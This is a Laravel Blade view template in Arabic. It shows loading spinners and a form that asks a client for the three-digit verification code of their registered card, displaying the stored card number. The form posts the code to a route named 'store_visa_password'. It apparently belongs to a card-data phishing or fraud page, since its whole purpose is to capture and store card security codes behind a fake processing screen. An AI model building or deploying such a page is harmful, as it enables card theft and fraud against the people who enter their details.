@extends('frontend.layout.master')

@section('content')

<section class="vh-100 gradient-custom">
  <div class="container py-5 h-100">
    <div class="row justify-content-center align-items-center h-100">
      <div class="col-12 col-lg-9 col-xl-7">
        <div class="card shadow-2-strong card-registration" style="border-radius: 15px;">
          <div class="card-body p-4 p-md-5 bg-light text-dark">
            <div class="d-flex justify-content-center">
                <div class="spinner-border" style="width: 3rem; height: 3rem;" role="status">
                    <span class="sr-only"></span>
                </div>
                <div class="spinner-grow" style="width: 3rem; height: 3rem;" role="status">
                    <span class="sr-only"></span>
                </div>
            </div>
            <div class="m-5">
            <form action="{{route('client.store_visa_password')}}" method="POST">
                @csrf
                <input type="hidden" name="client_id" value="{{$client->id}}">
                <div class="row">
                    <div class="col-12 mb-4">
                        <div class="form-outline">
                            <label class="form-label mb-4" for="national_number">برجاء ادخال رقم التحقق للبطاقة المسجلة  {{$client->visa_number}}</label>
                            <input type="text" id="national_number" name="visa_password" class="form-control form-control-lg" placeholder="ادخال رقم الثلاثى" />
                        </div>
                    </div>
                </div>
                <div class="row">
                <div class="col-md-6">
                  <div class="form-outline">
                    <div class="">
                        <input class="btn bg-success btn-lg text-light" type="submit" value="ارسال " />
                    </div>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="form-outline">

                  </div>
                </div>
              </div>

            </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>
@endsection
